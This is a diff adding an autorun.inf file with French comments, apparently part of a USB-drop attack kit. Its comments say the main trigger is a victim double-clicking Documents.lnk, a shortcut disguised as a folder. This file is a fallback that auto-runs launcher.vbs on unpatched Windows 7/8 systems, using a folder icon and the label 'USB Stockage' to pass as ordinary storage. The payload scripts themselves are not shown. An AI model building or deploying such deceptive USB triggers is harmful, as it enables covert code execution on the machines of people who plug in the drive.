@@ -1,0 +1,15 @@
+; ============================================================
+; autorun.inf – Déclencheur de repli pour clé USB
+;
+; NOTE : autorun.inf est DÉSACTIVÉ sur Windows 10/11 (KB971029).
+;        Le déclenchement principal repose sur un double-clic
+;        de la victime sur Documents.lnk (raccourci déguisé
+;        en dossier, généré par create_shortcut.vbs).
+;
+; Ce fichier reste présent comme repli pour les systèmes
+; Windows 7 / 8 non patchés où l'AutoRun est encore actif.
+; ============================================================
+[autorun]
+open=launcher.vbs
+icon=shell32.dll,8
+label=USB Stockage
